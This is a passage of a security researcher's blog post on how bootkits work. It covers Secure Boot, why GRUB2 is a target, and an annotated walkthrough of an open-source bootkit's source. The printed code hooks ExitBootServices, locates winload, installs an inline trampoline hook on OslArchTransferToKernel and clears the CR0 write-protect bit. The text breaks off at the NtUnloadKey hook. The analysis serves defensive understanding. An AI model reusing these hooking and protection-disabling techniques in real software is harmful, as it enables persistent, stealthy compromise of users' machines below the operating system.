# The anatomy of a bootkit
This year I [discovered](https://www.microsoft.com/en-us/security/blog/2025/03/31/analyzing-open-source-bootloaders-finding-vulnerabilities-faster-with-ai/) some interesting vulnerabilities in [GRUB2](https://www.gnu.org/software/grub/), the de-facto Linux bootloader standard.  
But why are vulnerabilities in a bootloader are so interesting? That's what I'd like to explain today.  

## GRUB2 and Secure Boot
Before 2006, Intel-based computers booted into startup firmware code commonly known as the [BIOS](https://en.wikipedia.org/wiki/BIOS) (Basic Input/Output System), which was responsible for hardware initialization and setup of common services to later be used by a [bootloader](https://en.wikipedia.org/wiki/Bootloader). Ultimately, the BIOS would transfer control to a Bootloader coded in Real Mode, which would commonly load an operating system.  
With time, attackers realized there is no root-of-trust verification of bootloaders by the firmware, thus began the era of Bootkits, which are bootloader-based rootkits.  To standardize the boot process, a unified firmware schema to replace BIOS was introduced in 2006, which is currently known as [UEFI](https://en.wikipedia.org/wiki/UEFI) (Unified Extensible Firmware Interface).  
UEFI also helped combat Bootkits, as it offers services that validate bootloaders and its own extensible modules by means of digital signatures. That protocol is known as [Secure Boot](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-secure-boot), and is essential to establishing a root of trust for the boot process, in which the firmware verifies UEFI drivers and OS modules with a platform key or a Key Exchange Key, and bootloaders verify the loaded operating system.  
Trust is then achieved with the help of OEMs, which can sign code trusted by Secure Boot, by means of Certificate Authorities (CA). Essentially, OEMs sign code with their private key, and their public key is signed with a root CA, commonly [Microsoft’s UEFI CA](https://uefi.org/sites/default/files/resources/UEFI_Plugfest_2013_-_New_Orleans_-_Microsoft_UEFI_CA.PDF). This is also essential to supporting non-Windows bootloaders such as GRUB2 (which commonly boots Linux) and allowing 3rd party operating systems to benefit from Secure Boot. Since GRUB2 is fully open-sourced, vendors install a small program called a [Shim](https://www.gnu.org/software/grub/manual/grub/html_node/UEFI-secure-boot-and-shim.html), which is signed by Microsoft’s UEFI CA and is responsible for validating the integrity of GRUB2.

### The dangers of GRUB2
Since bootloaders run before operating systems run, they mostly have UEFI-provided services as APIs to rely on. Therefore, bootloaders do not benefit from modern operating systems security features, such as:
-	No-Execute (NX): known in Windows as [DEP](https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention) (Data Execution Prevention), and treats memory page execute protections. Before the introduction of NX, attackers could override return addresses (which are maintained in-memory) and jump to arbitrary code (commonly a [shellcode](https://en.wikipedia.org/wiki/Shellcode)) that could be placed via the provided input.
-	[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (Address Space Layout Randomization): randomizes the base address of modules, which makes return address overrides and function pointer overrides highly unreliable, since attackers do not know where usable code might be found.
-	Safe dynamic allocators: dynamic allocations are a favorite target for attackers, and modern operating systems harden their heap allocators with various techniques, including [Safe Unlinking](https://msrc.microsoft.com/blog/2009/05/safe-unlinking-in-the-kernel-pool/), [type-safety](https://security.apple.com/blog/towards-the-next-generation-of-xnu-memory-safety/), Pointer Authentication and [others](https://theapplewiki.com/wiki/Heap_Hardening).
-	[Stack cookies \ Canaries](https://en.wikipedia.org/wiki/Buffer_overflow_protection): those are randomly generated values pushed between the return address and local variables, on the stack, with the intent on detecting changes in their values before using the return address (commonly in a RET instruction).

 Additionally, GRUB2 offers complex logic to deal various features, including:
-	Image file parsers (PNG, TGA and JPEG)
-	Font parsing and support (PF2 file format)
-	Network support (HTTP, FTP, DNS, ICMP, etc.)
-	Various filesystem supportability (FAT, NTFS, EXT, JFS, HFS, ReiserFS, etc.)
-	Bash-like command-line utility
-	Extensible dynamic module loading capabilities

Furthermore, GRUB2 is coded in C, which is considered a memory-unsafe language, and as mentioned, does not benefit from any modern security mitigation. Considering the implication of defeating Secure Boot and strategically assessing the project (e.g. with Google’s [Rule of 2](https://chromium.googlesource.com/chromium/src/+/master/docs/security/rule-of-2.md)), it is clear why GRUB2 should become a lucrative target for vulnerability researchers.

## How does a bootkit work
As we explained, finding a vulnerability in an OEM-trusted bootloader (such as GRUB2) means attackers might be able to bypass Secure Boot.  
Since bootloader usually handle complex inputs, coded in unsafe languages, implement their own heap and do not use modern mitigations - getting arbitrary code execution is quite likely.  
Assuming an attacker is able to achieve arbitrary code execution - what should they do?  
For this I'd like to examine one Bootkit - initially I wanted to examine BlackLotus ([found on Github](https://github.com/ldpreload/BlackLotus/tree/main)) as a modern example, but the source code there actually is missing several key functions used there (and yes, it won't compile).  
I did find one very similar to it called [Calypso](https://github.com/3a1/Calypso/), which is way easier to read, so I will be sticking to it mostly.  
With that, let us examine some source code!  
Remark: in this analysis, I might be skipping some code to make this blogpost more comprehensible. 

### Hooking EFI services
This Bootkit is compiled as an EFI module - essentially, a PE file that can be loaded through UEFI. Therefore, its code will start at an `EfiMain` function, located in `Bootkit/main.cpp`:
```c
EXTERN_C EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable)
{
    global::RuntimeServices = SystemTable->RuntimeServices;
    global::BootServices    = SystemTable->BootServices;
    global::SystemTable     = SystemTable;

    global::ExitBootServices = global::BootServices->ExitBootServices;
    global::BootServices->ExitBootServices = ExitBootServicesWrapper;

    global::BootServices->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &global::NotifySetVirtualAddressMapEvent);

    return EFI_SUCCESS;
}
```

Each `EFI` module gets a pointer to a `SystemTable` which contains a bunch of other tables, which contain function pointers.  
Just like an old bootloader used to call `BIOS interrupts` to use as services (e.g. reading the disk or printing to the terminal), so do `EFI` modules get capabilities.  
The most important piece here is the [BootServices](https://uefi.org/specs/UEFI/2.9_A/07_Services_Boot_Services.html) which contain several functions.  
With that out of the way, the code here is very easy!
1. It saves several pointers in a global namespace (the services and the system table itself).
2. It saves the function pointer to `ExitBootServices` in that global as well, and then hooks it with the `ExitBootServicesWrapper` function. Note `ExitBootServices` is called just before the handoff to the OS kernel, so that's an excellent point to hook! Also note how easy it is to hook when you have function pointers and no page protections - essentially it's a single assignment in C!
3. It creates a callback for `SetVirtualAddressMap`, which we'll be using later

With that, let's continue to the `ExitBootServicesWrapper` function!

### Hooking OslArchTransferToKernel
The `ExitBootServicesWrapper` function (`Bootkit/ExitBootServicesWrapper.asm`) is actually coded in Assembly, but it's so short it's extremely easy to analyze:

```assembly
ExitBootServicesWrapper proc
    mov rax, [rsp]
    mov RetExitBootServices, rax
    jmp ExitBootServicesHook
ExitBootServicesWrapper endp
```

Since the return address is saved in the stack, `mov rax, [rsp]` simply saves that return address in the `RAX` register, puts it in a global called `RetExitBootServices` and transfers control to `ExitBootServicesHook`.  
The `ExitBootServicesHook` function (`Bootkit/ExitBootServices.cpp`) is also easy to read:

```c
EFI_STATUS EFIAPI ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
{
    SET_BACKGROUND(EFI_WHITE | EFI_BACKGROUND_RED);
    CLEAR_SCREEN();
    Log("Bootkit hook-chain sequence started");
    SLEEP(500);

    global::winload = memory::get_image_base(global::RetExitBootServices);
    if (!global::winload) 
    {
        Error("Can't find winload base!");
    }
    Log("Successfully found winload base");

    global::OslArchTransferToKernel = memory::scan_section(global::winload, ".text", (uint8_t*)&OslArchTransferToKernelPattern, sizeof(OslArchTransferToKernelPattern));
    if (!global::OslArchTransferToKernel)
    {
        Error("Can't find OslArchTransferToKernel address!");
    }
    Log("Successfully found OslArchTransferToKernel address");

    trampoline::Hook(global::OslArchTransferToKernel, (uint64_t) OslArchTransferToKernelHook, (uint8_t*) &global::OslArchTransferToKernelData);

    Log("ExitBootServices stage complete");
    global::BootServices->ExitBootServices = (EFI_EXIT_BOOT_SERVICES)global::ExitBootServices;
    return global::ExitBootServices(ImageHandle, MapKey);
}
```

The first part simply does some printing and logging, so we'll be skipping that part. The next parts are more interesting:
1. We save the PE image base of `RetExitBootServices` (the global we saved back in the Assembly code). Note `ExitBootServices` was called by `winload` (the Windows bootloader), so the return address for `ExitBootServices` exactly resides in `winload`. The `memory::get_image_base` function is quite heuristic but easy to understand - it searches for PE header ("MZ") in each aligned page, going backwards. I will be explaining it after the overview of this hook.
2. We find the function `OslArchTransferToKernel` function in `winload` by calling `memory::scan_section`, simply by finding a pattern in memory. We will be explaining how it works too, but you can think of it as [memmem](https://www.man7.org/linux/man-pages/man3/memmem.3.html) function in essence. The pattern `OslArchTransferToKernelPattern` is defined in `Bootkit/struct.h` and is defined as the bytes `0x33, 0xF6, 0x4C, 0x8B, 0xE1, 0x4C, 0x8B, 0xEA`, which matches the first few instructions of `OslArchTransferToKernel` function in `winload`.
3. We hook `OslArchTransferToKernel` and divert control to `OslArchTransferToKernelHook`. Note this is a different kind of hook! The previous EFI hook was done with function pointers, but the transition to `OslArchTransferToKernel` does not involve function pointers, so we rely on Trampoline hooking, which is a fancy way of saying we patch the assembly to jump somewhere else.
4. We restore the `ExitBootServices` function which we saved easlier and invoke it to transfer control back to `winload`.

In this code we relied on some utility functions that were also implemented, let's understand them as well.

#### memory::get_image_base
This function finds the base image of an address, heuristically, by going back one page (0x1000 bytes) back each time and seeing if it has a PE header ("MZ" bytes):

```c
uint64_t memory::get_image_base(uint64_t address)
{
	address = address & ~0xFFF;

	do {
		uint16_t value = *(uint16_t*)address;

		if (value == 0x5a4d)
		{
			return address;
		}

		address -= 0x1000;
	} while (address != 0);

	return address;
}
```

The `address & ~0xFFF;` operation simply performs memory alignment to a page (making it divisible by `0x1000` which is a page size).  
From that point of we get the 16-bit value of each memory page and compare to `0x5a4d` (reverse "MZ" since we work in a [Little-Endian](https://en.wikipedia.org/wiki/Endianness) architecture).  
If there is a match then we found the PE file base, otherwise we simply go back one page and try again.

#### memory::scan_section
This function finds a set of bytes (as I mentioned, similar to [memmem](https://www.man7.org/linux/man-pages/man3/memmem.3.html)) but in a defined PE section.  
When we called this function we called it with `".text"`, which is where code commonly resides in PE files.

```c
uint64_t memory::scan_section(uint64_t base_addr, const char* section, uint8_t* pattern, uint64_t pattern_size)
{
	uint64_t section_address = memory::get_section_address(base_addr, section);
	uint32_t section_size = memory::get_section_size(base_addr, section);

	for (uint64_t i = 0; i < section_size; ++i)
	{
		uint64_t current_address = section_address + i;

		if (memory::compare(pattern, (uint8_t*)current_address, pattern_size) == 0)
		{
			return current_address;
		}
	}

	return 0;
}
```

Assuming `memory::get_section_address` gets the section address and `memory::get_section_size` gets the section size, it becomes easy to understand what this code does - it goes byte by byte and compares memory with the pattern.  
There is a minor bug here, by the way - the variable `i` should iterate between `0` and the `section_size` *minus the pattern length*, othersise there might be memory reads outside of the section's limits.  
However, this doesn't really affect anything (keep in mind there are still no memory protection enforcements at this point when it comes to reading, at least) so this bug doesn't realistically manifest to anything noticable.  
Resolving the section address and size by their name is an easy exercise in PE parsing and I will not be covering it, code still exists under `Bootkit/memory.cpp` if you're interested.

#### trampoline::Hook
This function performs Trampoline hooking, i.e. patching the target's machine code with other instructions.  
It's implemented in `Bootkit/trampoline.cpp` and quite easy to understand:

```c
void trampoline::Hook(uint64_t function, uint64_t hook, uint8_t* original_data)
{
	uint8_t trampoline[] = 
	{
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* movabs rax, <address> */
		0xFF, 0xE0													/* jmp rax				 */
	};
	memory::copy(&hook, (uint64_t*)((uint8_t*)trampoline + 2), sizeof(uint64_t));

	memory::copy((uint64_t*)function, (uint64_t*)original_data, TRAMPOLINE_SIZE);

	memory::copy_wp((uint64_t*)trampoline, (uint64_t*)function, TRAMPOLINE_SIZE);
}
```

The trampoline is easy - performs `movabs rax, <address>` and then `jmp rax` to make an absolute jump.  
We do 3 copies:
1. Copy the `hook` value into `trampoline + 2`, which will replace the zeros in the `trampoline` byte array.
2. Copy original `TRAMPOLINE_SIZE` (12) bytes to the `original_data`, since we are going to override those bytes.
3. Copy the `trampoline` bytes into the function, thus installing the hook.

Since we are not in a multi-threaded environment, there are no dangers with that last copy - in a multi-threaded environment you'd have a risk of having some code run in the middle of copying.  
A funny story is that I actually saw that happen live, in a MITRE evaluation - with the exact inline hooking approach - you can read all about it [here](https://www.microsoft.com/en-us/security/blog/2020/06/11/blue-teams-helping-red-teams-a-tale-of-a-process-crash-powershell-and-the-mitre-attck-evaluation/).  
One minor detail is the difference between `memory::copy` and `memory::copy_wp`, which is quite interesting in my opinion.  
Well, `memory::copy` performs the equivalent of [memcpy](https://man7.org/linux/man-pages/man3/memcpy.3.html) (with sub-optimal performance, but I won't talk about that aspect too much) and is trivial.  
The `memory::copy_wp` function is more interesting - it called `memory::copy` wrapped between `__disable_wp` and `__enable_wp` calls. What are those?  
Let's examine `__disable_wp` (`__enable_wp`) does the exact opposite) - it's implemented under `Bootkit/wp.asm`:

```assembly
__disable_wp proc
    cli
    mov rax, cr0
    and rax, 0FFFEFFFFh
    mov cr0, rax
    sti                        
    ret
__disable_wp endp
```

This procedure:
1. Disables all interrupts with `cli`.
2. Modifies the `cr0` register by performing a bitwise AND of it with `0FFFEFFFFh`, which essentially zeros the 16th bit. The 16th bit in the `cr0` register is the `WP` (Write-Protection) bit, which essentially ensures we can write to Read-Only pages. The `cr0` register has other interesting flags that affect how the machine operates - you can read more about it [here](https://en.wikipedia.org/wiki/Control_register).
3. Enables interrupts with `sti`.

So, at this point we have inline-hooked the `OslArchTransferToKernel` function - let's continue!

### Hooking NtUnloadKey
Function `OslArchTransferToKernelHook` is implemented in `Bootkit/OslArchTransferToKernel.cpp` and is supposed to be called instead of `OslArchTransferToKernel` due to the inline (Trampoline) hooking.  
